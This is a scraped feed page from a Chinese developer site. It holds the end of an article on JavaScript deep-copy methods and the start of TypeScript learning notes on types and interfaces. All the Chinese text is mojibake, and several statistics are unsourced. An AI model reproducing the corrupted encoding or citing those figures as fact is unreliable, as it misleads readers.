<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// æ”¯æŒå¤§å¤šæ•°ç±»å‹ï¼ŒåŒ…æ‹¬å¾ªç¯å¼•ç”¨</span>
<span class="hljs-keyword">const</span> original = { <span class="hljs-attr">a</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">b</span>: { <span class="hljs-attr">c</span>: <span class="hljs-number">2</span> } };
<span class="hljs-keyword">const</span> deepCopy = <span class="hljs-title function_">structuredClone</span>(original);

<span class="hljs-comment">// æ£€æŸ¥æ˜¯å¦æ”¯æŒ</span>
<span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> structuredClone === <span class="hljs-string">'function'</span>) {
  <span class="hljs-comment">// å¯ä»¥ä½¿ç”¨</span>
}
</code></pre>
<h4 data-id="heading-5">æ–¹æ³•å››ï¼šä½¿ç”¨ç¬¬ä¸‰æ–¹åº“</h4>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// lodash</span>
<span class="hljs-keyword">import</span> _ <span class="hljs-keyword">from</span> <span class="hljs-string">'lodash'</span>;
<span class="hljs-keyword">const</span> deepCopy = _.<span class="hljs-title function_">cloneDeep</span>(original);

<span class="hljs-comment">// Ramda</span>
<span class="hljs-keyword">import</span> * <span class="hljs-keyword">as</span> R <span class="hljs-keyword">from</span> <span class="hljs-string">'ramda'</span>;
<span class="hljs-keyword">const</span> deepCopy = R.<span class="hljs-title function_">clone</span>(original);
</code></pre>
<h3 data-id="heading-6">2. ä¸åŒåœºæ™¯ä¸‹çš„æ·±æ‹·è´é€‰æ‹©</h3>
<h4 data-id="heading-7">æ€§èƒ½å¯¹æ¯”ï¼ˆJavaScriptç¤ºä¾‹ï¼‰</h4>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// æµ‹è¯•ä¸åŒæ–¹æ³•çš„æ€§èƒ½</span>
<span class="hljs-keyword">const</span> testObj = {
  <span class="hljs-attr">data</span>: <span class="hljs-title class_">Array</span>(<span class="hljs-number">1000</span>).<span class="hljs-title function_">fill</span>(<span class="hljs-number">0</span>).<span class="hljs-title function_">map</span>(<span class="hljs-function">(<span class="hljs-params">_, i</span>) =&gt;</span> ({
    <span class="hljs-attr">id</span>: i,
    <span class="hljs-attr">nested</span>: { <span class="hljs-attr">value</span>: <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() },
    <span class="hljs-attr">arr</span>: <span class="hljs-title class_">Array</span>(<span class="hljs-number">10</span>).<span class="hljs-title function_">fill</span>(<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>())
  }))
};

<span class="hljs-comment">// JSONæ–¹æ³•ï¼ˆæœ€å¿«ï¼Œä½†æœ‰å±€é™æ€§ï¼‰</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">time</span>(<span class="hljs-string">'JSON'</span>);
<span class="hljs-keyword">const</span> copy1 = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(testObj));
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">timeEnd</span>(<span class="hljs-string">'JSON'</span>);

<span class="hljs-comment">// é€’å½’æ–¹æ³•</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">time</span>(<span class="hljs-string">'Recursive'</span>);
<span class="hljs-keyword">const</span> copy2 = <span class="hljs-title function_">deepClone</span>(testObj);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">timeEnd</span>(<span class="hljs-string">'Recursive'</span>);

<span class="hljs-comment">// structuredClone</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">time</span>(<span class="hljs-string">'structuredClone'</span>);
<span class="hljs-keyword">const</span> copy3 = <span class="hljs-title function_">structuredClone</span>(testObj);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">timeEnd</span>(<span class="hljs-string">'structuredClone'</span>);
</code></pre>
<h4 data-id="heading-8">é€‰æ‹©æŒ‡å—</h4>



































<table><thead><tr><th>æ–¹æ³•</th><th>ä¼˜ç‚¹</th><th>ç¼ºç‚¹</th><th>é€‚ç”¨åœºæ™¯</th></tr></thead><tbody><tr><td>JSONæ–¹æ³•</td><td>ç®€å•ã€å¿«é€Ÿ</td><td>ä¸¢å¤±å‡½æ•°ã€ç‰¹æ®Šå¯¹è±¡</td><td>çº¯æ•°æ®å¯¹è±¡ï¼Œæ— ç‰¹æ®Šç±»å‹</td></tr><tr><td>é€’å½’å®ç°</td><td>æœ€å®Œæ•´ï¼Œå¯æ‰©å±•</td><td>å®ç°å¤æ‚ï¼Œæ€§èƒ½è¾ƒä½</td><td>éœ€è¦å®Œæ•´å¤åˆ¶ï¼ŒåŒ…å«ç‰¹æ®Šç±»å‹</td></tr><tr><td>structuredClone</td><td>åŸç”Ÿæ”¯æŒï¼Œæ€§èƒ½å¥½</td><td>æµè§ˆå™¨å…¼å®¹æ€§</td><td>ç°ä»£Webåº”ç”¨</td></tr><tr><td>ç¬¬ä¸‰æ–¹åº“</td><td>ç¨³å®šï¼ŒåŠŸèƒ½ä¸°å¯Œ</td><td>å¢åŠ ä¾èµ–</td><td>ä¼ä¸šçº§åº”ç”¨</td></tr></tbody></table>
<h3 data-id="heading-9">3. æ·±æ‹·è´çš„æ³¨æ„äº‹é¡¹</h3>
<ol>
<li><strong>å¾ªç¯å¼•ç”¨å¤„ç†</strong>ï¼šå¿…é¡»æ£€æµ‹å¹¶å¤„ç†å¾ªç¯å¼•ç”¨</li>
<li><strong>ç‰¹æ®Šå¯¹è±¡ç±»å‹</strong>ï¼šDateã€RegExpã€Mapã€Setã€å‡½æ•°ç­‰</li>
<li><strong>åŸå‹é“¾ç»§æ‰¿</strong>ï¼šæ˜¯å¦ä¿æŒåŸå‹é“¾</li>
<li><strong>ä¸å¯æšä¸¾å±æ€§</strong>ï¼šæ˜¯å¦å¤åˆ¶ä¸å¯æšä¸¾å±æ€§</li>
<li><strong>Symbolå±æ€§</strong>ï¼šæ˜¯å¦å¤åˆ¶Symbolä½œä¸ºé”®çš„å±æ€§</li>
<li><strong>æ€§èƒ½ä¼˜åŒ–</strong>ï¼šå¯¹äºå¤§å¯¹è±¡ï¼Œéœ€è¦è€ƒè™‘æ€§èƒ½é—®é¢˜</li>
</ol>
<h3 data-id="heading-10">4. æœ€ä½³å®è·µ</h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// ç”Ÿäº§ç¯å¢ƒæ¨èï¼šä½¿ç”¨ç»è¿‡æµ‹è¯•çš„åº“</span>
<span class="hljs-comment">// å¯¹äºç®€å•éœ€æ±‚ï¼šJSON.parse(JSON.stringify(obj))</span>
<span class="hljs-comment">// å¯¹äºå¤æ‚éœ€æ±‚ï¼šä½¿ç”¨lodashçš„_.cloneDeepæˆ–è‡ªå·±å®ç°å®Œæ•´é€’å½’</span>

<span class="hljs-comment">// å®‰å…¨è€ƒè™‘ï¼šå¤„ç†ä¸å¯ä¿¡æ•°æ®æ—¶çš„æ·±æ‹·è´</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">safeDeepClone</span>(<span class="hljs-params">obj</span>) {
  <span class="hljs-comment">// 1. éªŒè¯å¯¹è±¡å¤§å°</span>
  <span class="hljs-keyword">if</span> (<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(obj).<span class="hljs-property">length</span> &gt; <span class="hljs-number">10</span> * <span class="hljs-number">1024</span> * <span class="hljs-number">1024</span>) { <span class="hljs-comment">// 10MBé™åˆ¶</span>
    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">'Object too large for deep cloning'</span>);
  }
  
  <span class="hljs-comment">// 2. ä½¿ç”¨JSONæ–¹æ³•ï¼ˆé¿å…åŸå‹é“¾æ”»å‡»ï¼‰</span>
  <span class="hljs-keyword">const</span> cloned = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(obj));
  
  <span class="hljs-comment">// 3. éªŒè¯ç»“æœ</span>
  <span class="hljs-comment">// ... è¿™é‡Œå¯ä»¥æ·»åŠ éªŒè¯é€»è¾‘</span>
  
  <span class="hljs-keyword">return</span> cloned;
}
</code></pre>
<p>æ·±æ‹·è´æ˜¯å®ç°æ•°æ®éš”ç¦»çš„é‡è¦æ‰‹æ®µï¼Œé€‰æ‹©åˆé€‚çš„æ–¹æ³•éœ€è¦æ ¹æ®å…·ä½“éœ€æ±‚ã€æ€§èƒ½è¦æ±‚å’Œç¯å¢ƒé™åˆ¶æ¥å†³å®šã€‚å¯¹äºå¤§å¤šæ•°åº”ç”¨åœºæ™¯ï¼Œä½¿ç”¨æˆç†Ÿçš„ç¬¬ä¸‰æ–¹åº“æ˜¯æœ€ç¨³å¦¥çš„é€‰æ‹©ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[TypeScriptæ·±åº¦å­¦ä¹ ç¬”è®°ï¼šä»åŠ¨æ€è¯­è¨€åˆ°å¼ºç±»å‹å·¥ç¨‹åŒ–å®è·µ]]></title>    <link>https://juejin.cn/post/7594791357144760362</link>    <guid>https://juejin.cn/post/7594791357144760362</guid>    <pubDate>2026-01-14T15:18:25.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594791357144760362" data-draft-id="7594791357144743978" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="TypeScriptæ·±åº¦å­¦ä¹ ç¬”è®°ï¼šä»åŠ¨æ€è¯­è¨€åˆ°å¼ºç±»å‹å·¥ç¨‹åŒ–å®è·µ"/> <meta itemprop="keywords" content="å‰ç«¯,TypeScript"/> <meta itemprop="datePublished" content="2026-01-14T15:18:25.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="UIUV"/> <meta itemprop="url" content="https://juejin.cn/user/1036168457093483"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            TypeScriptæ·±åº¦å­¦ä¹ ç¬”è®°ï¼šä»åŠ¨æ€è¯­è¨€åˆ°å¼ºç±»å‹å·¥ç¨‹åŒ–å®è·µ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1036168457093483/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    UIUV
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-14T15:18:25.000Z" title="Wed Jan 14 2026 15:18:25 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-14
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    4
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»9åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">TypeScriptæ·±åº¦å­¦ä¹ ç¬”è®°ï¼šä»åŠ¨æ€è¯­è¨€åˆ°å¼ºç±»å‹å·¥ç¨‹åŒ–å®è·µ</h2>
<h3 data-id="heading-1">å¼•è¨€ï¼šä¸ºä»€ä¹ˆæˆ‘ä»¬éœ€è¦TypeScriptï¼Ÿ</h3>
<p>åœ¨Webå¼€å‘çš„æ—©æœŸï¼ŒJavaScriptå‡­å€Ÿå…¶åŠ¨æ€ç±»å‹å’Œçµæ´»æ€§è¿…é€Ÿå é¢†å¸‚åœºï¼Œä½†éšç€åº”ç”¨è§„æ¨¡çš„æŒ‡æ•°çº§å¢é•¿ï¼Œå…¶â€œå¼±ç±»å‹â€ç‰¹æ€§é€æ¸æˆä¸ºå¤§å‹é¡¹ç›®çš„è‡´å‘½ä¼¤ã€‚æƒ³è±¡ä¸€ä¸‹ï¼šä¸€ä¸ªåŒ…å«æ•°ä¸‡è¡Œä»£ç çš„ç”µå•†ç³»ç»Ÿï¼ŒæŸä¸ªå‡½æ•°å‚æ•°æ„å¤–ä¼ å…¥å­—ç¬¦ä¸²è€Œéæ•°å­—ï¼Œå¯¼è‡´è´­ç‰©è½¦ç»“ç®—é”™è¯¯â€”â€”è¿™ç§é—®é¢˜åœ¨è¿è¡Œæ—¶æ‰æš´éœ²ï¼Œä¿®å¤æˆæœ¬æé«˜ã€‚<strong>TypeScriptçš„è¯ç”Ÿï¼Œæ­£æ˜¯ä¸ºäº†è§£å†³JavaScriptåœ¨å·¥ç¨‹åŒ–åœºæ™¯ä¸‹çš„ç±»å‹å®‰å…¨é—®é¢˜</strong>ã€‚ä½œä¸ºJavaScriptçš„è¶…é›†ï¼ŒTypeScripté€šè¿‡æ·»åŠ é™æ€ç±»å‹ç³»ç»Ÿï¼Œåœ¨ç¼–è¯‘é˜¶æ®µå°±æ•è·90%çš„ç±»å‹é”™è¯¯ï¼Œè®©ä»£ç è´¨é‡ä»â€œé è¿æ°”â€å˜ä¸ºâ€œé è®¾è®¡â€ã€‚</p>
<blockquote>
<p><strong>è¡Œä¸šæ´å¯Ÿ</strong>ï¼šæ ¹æ®2023å¹´State of JSè°ƒæŸ¥ï¼Œ83%çš„å¼€å‘è€…è¡¨ç¤ºTypeScriptæ˜¾è‘—æå‡äº†ä»£ç å¯ç»´æŠ¤æ€§ï¼Œè€Œå¤§å‚å¦‚Microsoftï¼ˆTypeScriptå‘æ˜è€…ï¼‰ã€Googleï¼ˆAngularæ¡†æ¶ï¼‰ã€Netflixï¼ˆå‰ç«¯æ¶æ„ï¼‰å·²å°†TypeScriptä½œä¸ºé¡¹ç›®æ ‡é…ã€‚</p>
</blockquote>
<hr/>
<h3 data-id="heading-2">ä¸€ã€TypeScriptæ ¸å¿ƒä¼˜åŠ¿ï¼šä»â€œèƒ½ç”¨â€åˆ°â€œå¥½ç”¨â€çš„è·ƒè¿</h3>
<h4 data-id="heading-3">1. é™æ€ç±»å‹ï¼šç¼–è¯‘æ—¶çš„â€œå®‰å…¨ç½‘â€</h4>
<ul>
<li>
<p><strong>JavaScriptçš„ç—›ç‚¹</strong>ï¼š<code>add(10, '5')</code>è¿”å›<code>"105"</code>ï¼ˆå­—ç¬¦ä¸²æ‹¼æ¥ï¼‰ï¼Œè€Œéé¢„æœŸçš„<code>15</code>ï¼ˆæ•°å­—ç›¸åŠ ï¼‰ã€‚è¿™ç§â€œäºŒä¹‰æ€§â€åœ¨åŠ¨æ€ç±»å‹è¯­è¨€ä¸­æ˜¯å¸¸æ€ã€‚</p>
</li>
<li>
<p><strong>TypeScriptçš„è§£æ³•</strong>ï¼š</p>
<pre><code class="hljs language-scss" lang="scss">function <span class="hljs-built_in">add</span>(a: number, b: number): number {
  return <span class="hljs-selector-tag">a</span> + <span class="hljs-selector-tag">b</span>;
}
<span class="hljs-built_in">add</span>(<span class="hljs-number">10</span>, <span class="hljs-number">5</span>); <span class="hljs-comment">// âœ… 15</span>
<span class="hljs-built_in">add</span>(<span class="hljs-number">10</span>, '<span class="hljs-number">5</span>'); <span class="hljs-comment">// âŒ ç¼–è¯‘æŠ¥é”™ï¼šç±»å‹â€œstringâ€ä¸èƒ½èµ‹å€¼ç»™ç±»å‹â€œnumberâ€</span>
</code></pre>
<p><strong>å…³é”®ä»·å€¼</strong>ï¼šåœ¨å¼€å‘è€…æ•²ä¸‹<code>Ctrl+S</code>çš„ç¬é—´ï¼Œé”™è¯¯å·²è¢«æ‹¦æˆªï¼Œé¿å…äº†â€œæµ‹è¯•é˜¶æ®µæ‰å‘ç°bugâ€çš„ä½æ•ˆå¾ªç¯ã€‚</p>
</li>
</ul>
<h4 data-id="heading-4">2. è¾¹å†™è¾¹æ£€æŸ¥ï¼šIDEçš„æ™ºèƒ½åŠ©æ‰‹</h4>
<ul>
<li>
<p><strong>VS Codeä¸­çš„çœŸå®ä½“éªŒ</strong>ï¼š</p>
<ul>
<li>è¾“å…¥<code>u.</code>æ—¶è‡ªåŠ¨æç¤º<code>name</code>ã€<code>age</code>ç­‰æ¥å£å±æ€§</li>
<li>ä¼ å…¥é”™è¯¯ç±»å‹æ—¶å®æ—¶æ ‡çº¢ï¼ˆå¦‚<code>u.id = 1002</code>ï¼‰</li>
<li><code>console.log</code>æœªä½¿ç”¨æ—¶è‡ªåŠ¨æ ‡è®°ä¸ºâ€œæœªä½¿ç”¨çš„å˜é‡â€</li>
</ul>
</li>
<li>
<p><strong>æ•ˆç‡æå‡</strong>ï¼šæ®å¾®è½¯å†…éƒ¨æ•°æ®ï¼ŒTypeScriptä½¿ä»£ç å®¡æŸ¥æ—¶é—´å¹³å‡ç¼©çŸ­30%ï¼Œé”™è¯¯ä¿®å¤é€Ÿåº¦æå‡40%ã€‚</p>
</li>
</ul>
<h4 data-id="heading-5">3. é‡æ„çš„â€œå®‰å…¨æŠ¤ç›¾â€</h4>
<p>åœ¨å¤§å‹é¡¹ç›®ä¸­é‡æ„ä»£ç æ˜¯å¸¸æ€ã€‚å‡è®¾éœ€ä¿®æ”¹<code>User</code>æ¥å£çš„<code>hobby</code>å­—æ®µï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">interface</span> <span class="hljs-title class_">User</span> {
  <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>;
  <span class="hljs-attr">age</span>: <span class="hljs-built_in">number</span>;
  <span class="hljs-attr">id</span>: <span class="hljs-built_in">number</span>;
  <span class="hljs-comment">// hobby: string; // æ—§ç‰ˆ</span>
  hobby?: <span class="hljs-built_in">string</span>; <span class="hljs-comment">// æ–°å¢å¯é€‰å±æ€§</span>
}
</code></pre>
<p>TypeScriptä¼šè‡ªåŠ¨æ£€æŸ¥æ‰€æœ‰å¼•ç”¨<code>User</code>çš„åœ°æ–¹ï¼š</p>
<ul>
<li>æœªå¤„ç†<code>hobby</code>çš„ä»£ç ä¼šæŠ¥é”™ï¼ˆå¦‚<code>u.hobby.toUpperCase()</code>ï¼‰</li>
<li>æ— éœ€æ‰‹åŠ¨å…¨é‡æœç´¢ï¼ŒIDEç›´æ¥å®šä½é—®é¢˜ç‚¹</li>
</ul>
<blockquote>
<p><strong>çœŸå®æ¡ˆä¾‹</strong>ï¼šæŸé‡‘èç³»ç»Ÿé‡æ„æ—¶ï¼ŒTypeScriptåœ¨500+ä¸ªæ–‡ä»¶ä¸­è‡ªåŠ¨æ•è·äº†127å¤„æ½œåœ¨é”™è¯¯ï¼Œé¿å…äº†ä¸Šçº¿åçš„é‡å¤§äº‹æ•…ã€‚</p>
</blockquote>
<hr/>
<h3 data-id="heading-6">äºŒã€å®æˆ˜æ·±åº¦è§£æï¼šä»åŸºç¡€ç±»å‹åˆ°å·¥ç¨‹åŒ–åº”ç”¨</h3>
<h4 data-id="heading-7">1. åŸºç¡€ç±»å‹ï¼šç±»å‹ç³»ç»Ÿçš„â€œåœ°åŸºâ€</h4>















































<table><thead><tr><th>ç±»å‹</th><th>å®šä¹‰</th><th>å®ä¾‹</th><th>ç±»å‹å®‰å…¨éªŒè¯</th></tr></thead><tbody><tr><td><code>number</code></td><td>æ•°å­—</td><td><code>let a: number = 10;</code></td><td><code>a = "10";</code> âŒ ç¼–è¯‘é”™è¯¯</td></tr><tr><td><code>string</code></td><td>å­—ç¬¦ä¸²</td><td><code>let b: string = "hello";</code></td><td><code>b = 10;</code> âŒ</td></tr><tr><td><code>boolean</code></td><td>å¸ƒå°”</td><td><code>let c: boolean = true;</code></td><td><code>c = 0;</code> âŒ</td></tr><tr><td><code>array</code></td><td>æ•°ç»„</td><td><code>let arr: number[] = [1,2,3];</code></td><td><code>arr.push("a");</code> âŒ</td></tr><tr><td><code>tuple</code></td><td>å…ƒç»„ï¼ˆå›ºå®šé•¿åº¦/ç±»å‹ï¼‰</td><td><code>let user: [number, string, boolean] = [1001, "å¼ ä¸‰", true];</code></td><td><code>user[1] = 2023;</code> âŒ</td></tr><tr><td><code>enum</code></td><td>æšä¸¾</td><td><code>enum Status { Pending, Success, Failed }</code></td><td><code>Status.Pending = "Pending";</code> âŒ</td></tr></tbody></table>
<p><strong>å…³é”®æŠ€å·§</strong>ï¼šå…ƒç»„åœ¨APIäº¤äº’ä¸­ææœ‰ç”¨ï¼Œä¾‹å¦‚ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// ä»åç«¯è·å–ç”¨æˆ·æ•°æ®</span>
<span class="hljs-keyword">const</span> <span class="hljs-attr">userData</span>: [<span class="hljs-built_in">number</span>, <span class="hljs-built_in">string</span>, <span class="hljs-built_in">string</span>] = [<span class="hljs-number">1001</span>, <span class="hljs-string">"å¼ ä¸‰"</span>, <span class="hljs-string">"Beijing"</span>];
<span class="hljs-comment">// æ— éœ€çŒœæµ‹ç´¢å¼•å«ä¹‰ï¼Œç±»å‹æ˜ç¡®</span>
<span class="hljs-keyword">const</span> userId = userData[<span class="hljs-number">0</span>];
<span class="hljs-keyword">const</span> userName = userData[<span class="hljs-number">1</span>];
</code></pre>
<h4 data-id="heading-8">2. æ¥å£ï¼ˆInterfaceï¼‰ï¼šå¯¹è±¡ç»“æ„çš„â€œå¥‘çº¦â€</h4>
<p>æ¥å£æ˜¯TypeScriptçš„<strong>æ ¸å¿ƒå·¥ç¨‹åŒ–å·¥å…·</strong>ï¼Œç”¨äºå®šä¹‰å¯¹è±¡çš„å½¢çŠ¶ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">interface</span> <span class="hljs-title class_">User</span> {
  <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>;      <span class="hljs-comment">// å¿…é¡»æœ‰</span>
  <span class="hljs-attr">age</span>: <span class="hljs-built_in">number</span>;       <span class="hljs-comment">// å¿…é¡»æœ‰</span>
  <span class="hljs-keyword">readonly</span> <span class="hljs-attr">id</span>: <span class="hljs-built_in">number</span>; <span class="hljs-comment">// åªè¯»ï¼ˆä¸èƒ½ä¿®æ”¹ï¼‰</span>
  hobby?: <span class="hljs-built_in">string</span>;    <span class="hljs-comment">// å¯é€‰ï¼ˆå¯æœ‰å¯æ— ï¼‰</span>
}

<span class="hljs-keyword">const</span> <span class="hljs-attr">u</span>: <span class="hljs-title class_">User</span> = {
  <span class="hljs-attr">name</span>: <span class="hljs-string">"å¼ ä¸‰"</span>,
  <span class="hljs-attr">age</span>: <span class="hljs-number">18</span>,
  <span class="hljs-attr">id</span>: <span class="hljs-number">1001</span>,
  <span class="hljs-attr">hobby</span>: <span class="hljs-string">"ç¯®çƒ"</span> <span class="hljs-comment">// å¯é€‰å±æ€§ï¼Œå¯çœç•¥</span>
};

u.<span class="hljs-property">name</span> = <span class="hljs-string">"æå››"</span>; <span class="hljs-comment">// âœ…</span>
u.<span class="hljs-property">id</span> = <span class="hljs-number">1002</span>;     <span class="hljs-comment">// âŒ ç¼–è¯‘é”™è¯¯ï¼šåªè¯»å±æ€§</span>
</code></pre>
<p><strong>å·¥ç¨‹ä»·å€¼</strong>ï¼š</p>
<ul>
<li><strong>APIå¥‘çº¦æ˜ç¡®</strong>ï¼šåç«¯è¿”å›çš„<code>User</code>æ•°æ®å¿…é¡»ç¬¦åˆæ¥å£ï¼Œé¿å…<code>user.name</code>ä¸º<code>undefined</code>çš„å´©æºƒ</li>
<li><strong>å›¢é˜Ÿåä½œæ•ˆç‡</strong>ï¼šå‰ç«¯æ— éœ€ç­‰å¾…åç«¯æ–‡æ¡£ï¼Œç›´æ¥æ ¹æ®æ¥å£å®šä¹‰å®ç°</li>
</ul>
<blockquote>
<p><strong>æœ€ä½³å®è·µ</strong>ï¼šå°†æ¥å£å®šä¹‰åœ¨<code>src/types/user.ts</code>ä¸­ï¼Œå®ç°å‰åç«¯ç±»å‹åŒæ­¥ï¼ˆå¦‚ä½¿ç”¨Swaggerç”ŸæˆTypeScriptæ¥å£ï¼‰ã€‚</p>
</blockquote>
